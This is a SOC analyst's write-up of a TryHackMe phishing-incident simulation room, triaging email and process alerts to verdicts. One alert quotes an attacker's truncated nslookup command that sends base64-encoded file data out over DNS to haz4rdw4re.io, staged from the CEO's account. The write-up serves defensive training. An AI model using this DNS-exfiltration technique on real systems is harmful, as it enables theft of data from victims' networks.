# Phishing Unfolding

**Source:** TryHackMe — SOC Level 1 path
**Date:** 2026-07-07

## Overview

This is a SOC Simulator room: a live alert queue tied to an active phishing incident, worked one alert at a time as they fire rather than as a pre-packaged case file. The task is to triage each alert to a verdict — false positive, true positive with no impact, or true positive requiring escalation — and to keep pivoting as each alert's findings reshape the picture of what's actually happening on the network.

## Key Concepts

**Time-boxed pivoting to establish scope.** For each alert, the first move is a bounded pivot — a few hours on either side of the event — on the alerting sender, domain, or recipient to check for related activity. A domain that shows up once, with no other emails in the window, gets treated very differently from one that shows up dozens of times across multiple recipients.

**Interaction/click-through as the deciding factor.** The same alert rule (`Suspicious email from external domain`) fired four separate times in this queue, and the verdicts split three different ways. What decided each one wasn't the email content — it was whether the recipient interacted with it. No click, no further spread: close it out. Evidence of a domain hitting multiple inboxes: escalate as an active campaign.

**Alert rules are noisy by design, and that's visible in the tooling.** The `Suspicious email from external domain` rule literally carries a note from the SOC lead in its own description field: "This detection rule still needs fine-tuning." That's a real detail worth internalizing — a chunk of L1 work is running down alerts from rules that are known to be imprecise, not just rules that are broken.

**Recognizing legitimate parent-child process pairs closes out noise fast.** `TrustedInstaller.exe` spawning under `services.exe`, and `taskhostw.exe` spawning under `svchost.exe` with the `KEYROAMING` flag, are both normal Windows behavior (servicing and certificate/key-roaming sync, respectively). Knowing these pairs on sight — rather than having to research them mid-triage — is what keeps a "suspicious parent-child relationship" rule from eating the whole shift.

**User identity/role context as a red-flag multiplier.** The exfiltration alert's command line was attributed to the CEO's user account. A CEO is not the person who should be running recon and exfiltration commands from PowerShell — that mismatch between the account's normal role and its observed behavior was as important to the verdict as the command line itself.

**Consolidating duplicate and related alerts into one case.** Once the exfiltration chain was confirmed, the same host kept generating near-identical follow-on alerts (network mapping, disconnection events). Those got rolled into the original case rather than worked as separate tickets — the goal is one coherent incident record, not a pile of redundant alerts pointing at the same root cause.

## Alert: Suspicious email from external domain (inheritance scam)

![Alert details for a suspicious inheritance-scam email from an external domain](../../images/phishing-unfolding/Pasted%20image%2020260707114221.png)

**Details:** Low severity, Jul 7 2026 11:54 CST. Email with subject "Inheritance Alert: Unknown Billionaire Relative Left You Their Hat Fortunes," sent from `eileen@trendymillineryco.me` to `support@tryhatme.com`. No attachment. Body creates urgency and requests banking details.

**Investigation:** A 6-hour pivot on the sender domain `trendymillineryco.me` turned up no other emails from it. OSINT on the domain showed no existing malicious reports. A pivot on the recipient over the same window showed no clicks on the alerting email.

**Verdict:** True positive, phishing attempt with no success. Recommended deleting the email from the recipient's inbox and blocking the sender domain.

## Alert: Suspicious Parent Child Relationship (TrustedInstaller.exe)

![Case report for a TrustedInstaller.exe process spawned under services.exe](../../images/phishing-unfolding/Pasted%20image%2020260707120514.png)

**Details:** Low severity, Jul 7 2026 11:56 CST. Process `C:\Windows\servicing\TrustedInstaller.exe` created by parent process `services.exe` on host `win-3459`.

**Investigation:** Pivoted on the alerting process and found no further processes spawned or any other suspicious activity. A pivot on the host itself showed nothing else notable.

**Verdict:** False positive. `TrustedInstaller.exe` under `services.exe` is standard Windows servicing behavior.

## Alert: Suspicious Parent Child Relationship (taskhostw.exe KEYROAMING)

![Case report for a taskhostw.exe process spawned under svchost.exe with the KEYROAMING flag](../../images/phishing-unfolding/Pasted%20image%2020260707121451.png)

**Details:** Low severity, Jul 7 2026 11:59 CST. Process `taskhostw.exe` created by parent process `svchost.exe` on host `win-3451`, command line `taskhostw.exe KEYROAMING`.

**Investigation:** The `KEYROAMING` flag identifies this as the legitimate Windows background task responsible for syncing certificates and private keys across devices. A pivot on the host and process ID showed no other suspicious activity.

**Verdict:** False positive. Confirmed legitimate certificate/key-sync process.

## Alert: Suspicious email from external domain (spam, single recipient)

![Case report for a spam email sent from fashionindustrytrends.xyz to a single recipient](../../images/phishing-unfolding/Pasted%20image%2020260707122038.png)

**Details:** Low severity, Jul 7 2026 11:59 CST. Email with subject "Grow Your Hat Business Overnight with this Secret Formula," sent from `leonard@fashionindustrytrends.xyz` to `yani.zubair@tryhatme.com`.

**Investigation:** Content read as generic spam rather than targeted phishing. A pivot on the sender showed no other recipients; a pivot on the recipient showed no interaction with the email.

**Verdict:** True positive, but no further action required — the recipient never engaged with it.

## Alert: Suspicious email from external domain (spam campaign, multiple recipients)

![Case report for a spam email sent from fashionindustrytrends.xyz that turned out to be part of a wider campaign](../../images/phishing-unfolding/Pasted%20image%2020260707122603.png)

**Details:** Low severity, Jul 7 2026 12:02 CST. Email with subject "Time Traveling Hat Adventure Explore Ancient Lands for Cheap," sent from `osman@fashionindustrytrends.xyz` to `kyra.flores@tryhatme.com`.

**Investigation:** The recipient hadn't interacted with the email, but a pivot on the sender *domain* (rather than just this one sender address) showed multiple spam/phishing emails going out to multiple recipients across the organization.

**Verdict:** True positive, escalated as an active phishing/spam campaign. Recommended removing all emails from `fashionindustrytrends.xyz` across every affected inbox and blocking the domain — the domain-level pivot is what turned an isolated non-event into an org-wide remediation.

## Alert: Suspicious Parent Child Relationship (nslookup.exe exfiltration staging)

![Case report for an nslookup.exe process with a suspicious encoded command line, spawned under powershell.exe from the CEO's account](../../images/phishing-unfolding/Pasted%20image%2020260707143048.png)

**Details:** High severity, Jul 7 2026 12:29 CST. Process `nslookup.exe` created by parent process `powershell.exe` on host `win-3450`, command line `"C:\Windows\system32\nslookup.exe" UEsDBBQAAAAIANigLlfVU3cDIgAAAI...haz4rdw4re.io`, working directory `C:\Users\michael.ascot\downloads\exfiltration\`.

**Investigation:** OSINT on the domain in the command line, `haz4rdw4re.io`, returned no malicious detections on its own. The Identity Inventory showed the associated user, `michael.ascot`, was the CEO — not someone who should plausibly be running this command. A pivot on the host revealed numerous reconnaissance commands and multiple attempts to package and exfiltrate files, including one named `BitcoinWalletPasscodes.txt`. Several related alerts on the same host — network mapping and a disconnection event — were consolidated into this case rather than worked separately.

**Verdict:** Escalated as exfiltration staging — clear evidence of reconnaissance and an attempted transfer, not a confirmed successful exfiltration. Recommended quarantining the host, revoking all authentication tokens for the affected user, rotating the password, and investigating further to determine whether the attempted transfer actually completed and what data may have left the network.

## Takeaway

The clearest thing this room demonstrates is that the alert rule name tells you almost nothing on its own. `Suspicious email from external domain` fired four times and closed out three different ways, purely on the strength of pivot results — interaction history, domain-wide sender activity — rather than anything different about the emails themselves. Same story on the process side: two "suspicious parent-child relationship" alerts were textbook Windows behavior, and the third was an active exfiltration attempt running under a spoofed high-privilege identity. A detection rule that "needs fine-tuning" isn't a rule to trust or distrust wholesale — it's a rule where every hit still needs the same pivot-and-verify discipline, because the payoff for catching the one real hit in a haystack of noise is exactly this: an exfiltration attempt caught while it was still being staged.
